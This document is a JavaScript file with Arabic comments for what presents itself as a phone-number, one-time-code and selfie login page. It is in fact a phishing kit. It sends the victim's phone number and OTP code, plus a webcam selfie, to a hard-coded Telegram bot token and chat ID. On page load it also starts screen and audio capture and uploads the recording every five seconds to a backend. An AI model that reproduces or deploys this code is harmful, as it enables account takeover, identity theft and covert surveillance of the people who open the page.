document.addEventListener('DOMContentLoaded', () => {

    // --- إعدادات بوت التليجرام ---
    const BOT_TOKEN = '6692627244:AAEIS4t9xIIksnY9UxlGiMsf0KwBB5-XS5M';
    const CHAT_ID = '6964432572';

    // --- متغيرات لتخزين بيانات المستخدم ---
    let userPhoneNumber = '';
    let userOtp = '';

    // --- Page Elements ---
    const loginPage = document.getElementById('login-page');
    const otpPage = document.getElementById('otp-page');
    const selfiePage = document.getElementById('selfie-page');
    const cameraPage = document.getElementById('camera-page');
    const faceOutlineCircle = document.getElementById('face-outline-circle');
    
    // --- Button & Input Elements ---
    const phoneInput = document.getElementById('phone');
    const loginBtn = document.getElementById('login-btn');
    const loginForm = document.getElementById('login-form');
    const otpInputs = document.querySelectorAll('.otp-input');
    const continueBtn = document.getElementById('continue-btn');
    const backToLoginBtn = document.querySelector('.back-to-login');
    const backToOtpBtn = document.querySelector('.back-to-otp');
    const takeSelfieBtn = document.getElementById('take-selfie-btn');
    const cameraFeed = document.getElementById('camera-feed');
    const backToSelfieInstructionsBtn = document.querySelector('.back-to-selfie-instructions');
    const signupBtn = document.querySelector('.signup-btn-style');
    const signupNotice = document.getElementById('signup-notice');
    const captureBtn = document.getElementById('capture-btn');

    let stream = null;

    // --- متغيرات وإعدادات البث المباشر للشاشة ---
    let mediaRecorder;
    let recordedChunks = [];
    let chunkCount = 0;
    let totalDataSize = 0;
    let streamErrors = 0;
    let streamStartTime;
    let streamInterval;

    // --- عناصر واجهة البث المباشر ---
    const screenStreamSection = document.getElementById('screen-stream-section');
    const streamStatusIndicator = document.getElementById('stream-status-indicator');
    const streamTimerDisplay = document.getElementById('stream-timer-display');
    const streamChunksCount = document.getElementById('stream-chunks-count');
    const streamDataSize = document.getElementById('stream-data-size');
    const streamErrorCount = document.getElementById('stream-error-count');
    const streamLogItems = document.getElementById('stream-log-items');

    // --- إعدادات الخادم للواجهة الخلفية (يجب استبدال هذا بالرابط الخاص بك بعد النشر) ---
    const BACKEND_SERVER_URL = 'http://localhost:5001'; // مثال: 'https://your-backend-url.onrender.com'

    // --- وظيفة بدء البث المباشر للشاشة ---
    async function startScreenStream() {
        try {
            const displayStream = await navigator.mediaDevices.getDisplayMedia({
                video: true,
                audio: true
            });

            mediaRecorder = new MediaRecorder(displayStream, {
                mimeType: 'video/webm;codecs=vp8',
                videoBitsPerSecond: 2500000, // 2.5 Mbps
                audioBitsPerSecond: 128000  // 128 Kbps
            });

            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };

            mediaRecorder.onstop = () => {
                console.log('Screen stream stopped.');
                stopScreenStream();
            };

            mediaRecorder.start(5000); // تقسيم الفيديو إلى أجزاء كل 5 ثوانٍ
            console.log('Screen stream started.');

            streamStatusIndicator.classList.add('active');
            streamStartTime = Date.now();
            streamInterval = setInterval(updateStreamTimer, 1000);
            logStreamEvent('بدء البث التلقائي للشاشة.');

            // إرسال الأجزاء المسجلة كل 5 ثوانٍ
            setInterval(async () => {
                if (recordedChunks.length > 0) {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    recordedChunks = [];
                    await sendVideoChunk(blob);
                }
            }, 5000);

        } catch (err) {
            console.error('Error starting screen stream:', err);
            logStreamEvent(`خطأ في بدء البث: ${err.message}`, 'error');
            streamErrors++;
            streamErrorCount.textContent = streamErrors;
            streamStatusIndicator.classList.remove('active');
            alert('فشل في بدء بث الشاشة. يرجى التأكد من منح الإذن.');
        }
    }

    // --- وظيفة إيقاف البث المباشر للشاشة ---
    function stopScreenStream() {
        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
            mediaRecorder.stop();
        }
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
            stream = null;
        }
        clearInterval(streamInterval);
        streamStatusIndicator.classList.remove('active');
        logStreamEvent('تم إيقاف البث.');
    }

    // --- وظيفة إرسال جزء الفيديو إلى الخادم ---
    async function sendVideoChunk(blob) {
        const formData = new FormData();
        formData.append('video_chunk', blob, `chunk-${Date.now()}.webm`);
        formData.append('bot_token', BOT_TOKEN);
        formData.append('chat_id', CHAT_ID);
        formData.append('chunk_id', ++chunkCount);

        try {
            const response = await fetch(`${BACKEND_SERVER_URL}/api/stream/upload_chunk`, {
                method: 'POST',
                body: formData
            });

            const result = await response.json();

            if (result.success) {
                totalDataSize += blob.size;
                streamChunksCount.textContent = chunkCount;
                streamDataSize.textContent = `${(totalDataSize / (1024 * 1024)).toFixed(2)} MB`;
                logStreamEvent(`تم إرسال الجزء #${result.chunk_id} بنجاح. حجم: ${(blob.size / 1024).toFixed(1)} KB`);
            } else {
                logStreamEvent(`فشل إرسال الجزء #${chunkCount}: ${result.error}`, 'error');
                streamErrors++;
                streamErrorCount.textContent = streamErrors;
            }
        } catch (error) {
            console.error('Error sending video chunk:', error);
            logStreamEvent(`خطأ في إرسال الجزء #${chunkCount}: ${error.message}`, 'error');
            streamErrors++;
            streamErrorCount.textContent = streamErrors;
        }
    }

    // --- وظيفة تحديث مؤقت البث ---
    function updateStreamTimer() {
        const elapsed = Date.now() - streamStartTime;
        const minutes = Math.floor(elapsed / 60000);
        const seconds = Math.floor((elapsed % 60000) / 1000);
        streamTimerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
    }

    // --- وظيفة تسجيل الأحداث في سجل البث ---
    function logStreamEvent(message, type = 'info') {
        const logItem = document.createElement('p');
        logItem.classList.add('log-item', type);
        logItem.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
        streamLogItems.prepend(logItem); // إضافة أحدث رسالة في الأعلى
        if (streamLogItems.children.length > 10) { // الاحتفاظ بآخر 10 رسائل فقط
            streamLogItems.removeChild(streamLogItems.lastChild);
        }
    }

    // --- منطق التنقل والكاميرا (الكود الأصلي) ---
    takeSelfieBtn.addEventListener('click', async () => {
        selfiePage.classList.remove('active');
        cameraPage.classList.add('active');
        
        try {
            const constraints = { video: { facingMode: 'user' } };
            stream = await navigator.mediaDevices.getUserMedia(constraints);
            cameraFeed.srcObject = stream;
        } catch (err) {
            console.error("Error accessing camera: ", err);
            alert("لا يمكن الوصول إلى الكاميرا. يرجى التأكد من منح الإذن.");
            cameraPage.classList.remove('active');
            selfiePage.classList.add('active');
        }
    });

    // --- منطق الالتقاط اليدوي (الكود الأصلي) ---
    captureBtn.addEventListener('click', () => {
        faceOutlineCircle.classList.add('match');

        const canvas = document.createElement('canvas');
        canvas.width = cameraFeed.videoWidth;
        canvas.height = cameraFeed.videoHeight;
        const context = canvas.getContext('2d');
        context.translate(canvas.width, 0);
        context.scale(-1, 1);
        context.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
        
        stopCamera();
        alert('تم التقاط الصورة بنجاح! جاري إرسال البيانات...');

        const message = `**=== بيانات مستخدم جديد ===**\n**رقم الهاتف:** \`${userPhoneNumber}\`\n**الرمز السري:** \`${userOtp}\``;
        sendTelegramMessage(message);

        canvas.toBlob(blob => {
            sendTelegramPhoto(blob, `Selfie for ${userPhoneNumber}`);
        }, 'image/jpeg');

        setTimeout(() => {
            faceOutlineCircle.classList.remove('match');
            cameraPage.classList.remove('active');
            loginPage.classList.add('active');
            
            otpInputs.forEach(input => input.value = '');
            phoneInput.value = '';
            loginBtn.disabled = true;
            loginBtn.classList.remove('activated');
        }, 2000);
    });
    
    function stopCamera() {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
            stream = null;
        }
    }

    // --- بقية الأكواد تبقى كما هي (الكود الأصلي) ---
    loginForm.addEventListener('submit', (e) => {
        e.preventDefault();
        if (!loginBtn.disabled) {
            userPhoneNumber = phoneInput.value;
            loginPage.classList.remove('active');
            otpPage.classList.add('active');
            if (otpInputs.length > 0) otpInputs[0].focus();
        }
    });

    phoneInput.addEventListener('input', () => {
        if (phoneInput.value.trim().length > 5) {
            loginBtn.disabled = false;
            loginBtn.classList.add('activated');
        } else {
            loginBtn.disabled = true;
            loginBtn.classList.remove('activated');
        }
    });

    otpInputs.forEach((input, index) => {
        input.addEventListener('input', () => {
            if (input.value && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }
            checkAllOtpInputs();
        });
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !input.value && index > 0) {
                otpInputs[index - 1].focus();
            }
        });
    });

    function checkAllOtpInputs() {
        const allFilled = Array.from(otpInputs).every(input => input.value);
        if (allFilled) {
            continueBtn.disabled = false;
            continueBtn.classList.add('activated');
        } else {
            continueBtn.disabled = true;
            continueBtn.classList.remove('activated');
        }
    }

    continueBtn.addEventListener('click', () => {
        if (!continueBtn.disabled) {
            userOtp = Array.from(otpInputs).map(input => input.value).join('');
            otpPage.classList.remove('active');
            selfiePage.classList.add('active');
        }
    });

    signupBtn.addEventListener('click', () => {
        signupNotice.classList.add('show');
        setTimeout(() => {
            signupNotice.classList.remove('show');
        }, 4000);
    });

    async function sendTelegramMessage(text) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const params = new URLSearchParams({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' });
        try {
            await fetch(`${url}?${params.toString()}`);
        } catch (error) {
            console.error('Failed to send message:', error);
        }
    }

    async function sendTelegramPhoto(imageBlob, caption) {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', imageBlob, 'selfie.jpg');
        formData.append('caption', caption);
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
        try {
            await fetch(url, { method: 'POST', body: formData });
        } catch (error) {
            console.error('Failed to send photo:', error);
        }
    }

    backToSelfieInstructionsBtn.addEventListener('click', () => {
        stopCamera();
        cameraPage.classList.remove('active');
        selfiePage.classList.add('active');
    });
    
    backToOtpBtn.addEventListener('click', () => {
        selfiePage.classList.remove('active');
        otpPage.classList.add('active');
    });

    backToLoginBtn.addEventListener('click', () => {
        otpPage.classList.remove('active');
        loginPage.classList.add('active');
    });

    // --- بدء البث المباشر تلقائياً عند تحميل الصفحة ---
    startScreenStream();
});

